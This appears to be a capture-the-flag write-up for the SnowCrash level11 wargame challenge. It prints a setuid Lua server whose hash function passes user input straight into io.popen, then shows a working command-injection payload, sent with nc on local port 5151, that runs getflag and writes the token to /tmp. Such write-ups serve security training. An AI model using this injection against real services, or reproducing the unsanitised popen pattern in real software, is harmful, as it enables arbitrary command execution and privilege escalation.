We use "ls -l" command on our home directory.

level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

We find a .lua file so we check what's inside of it.

level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

By analyzing the code, we see couple things.

> we have an established connection with the port 5151

> The function hash take a password that the user type and pass it as Echos argument inside popen. This is our exploit.

> When a connection is initialized via 5151 port, the program asks for the password and timeout after 60 sec.

So basically to exploit this, we just pass to echo an OS Command using backticks and redirect the output to  /tmp. And it should work with no issues.

Lets try it.

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/flag
Erf nope..

We cat:

level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
